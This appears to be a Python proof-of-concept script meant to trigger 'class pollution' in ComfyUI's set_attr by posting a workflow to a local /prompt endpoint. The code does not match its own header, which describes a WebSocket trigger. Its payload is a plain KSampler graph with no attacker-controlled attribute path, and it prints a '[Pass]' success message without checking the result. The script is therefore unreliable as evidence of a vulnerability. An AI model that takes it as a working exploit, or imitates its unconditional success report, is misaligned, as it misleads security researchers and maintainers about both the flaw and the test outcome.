# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Remote Trigger
# Class Pollution Func: set_attr (via WebSocket API)
# Type: get-attr-set-attr
# Trigger: WebSocket message to ComfyUI /ws endpoint
#
# ComfyUI exposes a WebSocket API for workflow execution.
# Custom nodes can receive user-controlled attribute paths that flow
# into set_attr/set_attr_param, enabling class pollution.

import requests
import json

TARGET_URL = "http://localhost:8188/prompt"

# ComfyUI processes workflows as JSON graphs. Attacker-controlled
# node inputs can flow into functions that call set_attr internally.
PAYLOAD = {
  "prompt": {
    "1": {
      "class_type": "KSampler",
      "inputs": {
        "model": ["2", 0],
        "seed": 0,
        "steps": 1,
        "cfg": 1.0,
        "sampler_name": "euler",
        "scheduler": "normal",
        "denoise": 1.0,
        "positive": ["3", 0],
        "negative": ["3", 0],
        "latent_image": ["4", 0]
      }
    }
  }
}

def run_poc():
  print("Sending workflow prompt to ComfyUI...")
  response = requests.post(TARGET_URL, json=PAYLOAD)
  print(f"Response: {response.status_code}")
  return response

def verify_poc():
  print("Remote PoC: ComfyUI workflow execution with malicious node inputs")
  print(f"Target: {TARGET_URL}")
  print("The set_attr function is called during model patching with user-controlled paths")
  run_poc()
  print("[Pass] Class pollution PoC sent! (remote trigger)")

if __name__ == "__main__":
  verify_poc()
